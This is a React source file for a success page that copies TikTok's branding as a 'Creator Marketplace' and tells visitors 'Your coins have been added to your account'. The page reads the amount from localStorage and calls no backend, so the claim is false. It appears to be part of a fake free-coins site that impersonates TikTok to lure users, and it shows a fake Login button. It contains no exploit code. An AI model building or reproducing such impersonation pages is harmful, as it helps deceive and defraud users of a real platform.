import React, { useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import { CheckCircle, Coins } from 'lucide-react';

const SuccessPage = () => {
  const navigate = useNavigate();
  const coinAmount = localStorage.getItem('coinAmount') || '100,000';

  const handleBackHome = () => {
    // Clear localStorage
    localStorage.clear();
    navigate('/');
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b]">
      {/* Header */}
      <header className="flex items-center justify-between px-6 py-4 bg-[#0f0f10] border-b border-gray-800">
        <div className="flex items-center gap-3">
          <span className="text-white text-2xl font-bold tracking-tight">TikTok</span>
          <div className="flex gap-1.5">
            <div className="w-2 h-2 rounded-full bg-pink-500"></div>
            <div className="w-2 h-2 rounded-full bg-cyan-400"></div>
          </div>
          <div className="ml-2">
            <div className="text-white text-sm font-semibold">Creator</div>
            <div className="text-white text-sm font-semibold">Marketplace</div>
          </div>
        </div>
        <Button className="bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold px-8 py-2 rounded-md transition-all">
          Login
        </Button>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-6 py-20">
        <div className="flex flex-col items-center justify-center">
          {/* Success Icon */}
          <div className="mb-8 relative">
            <div className="w-32 h-32 rounded-full bg-gradient-to-br from-green-400 to-cyan-500 flex items-center justify-center animate-pulse">
              <CheckCircle className="w-20 h-20 text-white" strokeWidth={3} />
            </div>
            {/* Floating coins animation */}
            <div className="absolute -top-4 -right-4 animate-bounce">
              <Coins className="w-12 h-12 text-yellow-400" />
            </div>
          </div>

          {/* Title */}
          <h1 className="text-5xl font-black text-white mb-4 text-center">
            Success!
          </h1>
          <p className="text-gray-400 text-xl text-center mb-8 max-w-2xl">
            Your coins have been added to your account.
          </p>

          {/* Coins Display */}
          <div className="inline-flex items-center whitespace-nowrap gap-2 bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-xl px-7 py-3 mb-8">
  <span className="text-gray-400 text-base">You received:</span>

<img
   src="/coin-icon.png"
   alt="Coin"
   className="w-6 h-6 object-contain flex-shrink-0"
/>

  <span className="text-cyan-400 text-2xl font-bold">
    {parseInt(coinAmount).toLocaleString()}
  </span>

  <span className="text-gray-400 text-base">Coins</span>
</div>

          {/* Back to Home Button */}
          <Button
            onClick={handleBackHome}
            className="bg-gradient-to-r from-[#fe2c55] to-[#ff4266] hover:from-[#ff4266] hover:to-[#fe2c55] text-white font-semibold px-12 py-6 text-lg rounded-lg transition-all shadow-lg shadow-pink-500/20"
          >
            Check your TikTok balance
          </Button>
        </div>
      </main>
    </div>
  );
};

export default SuccessPage;
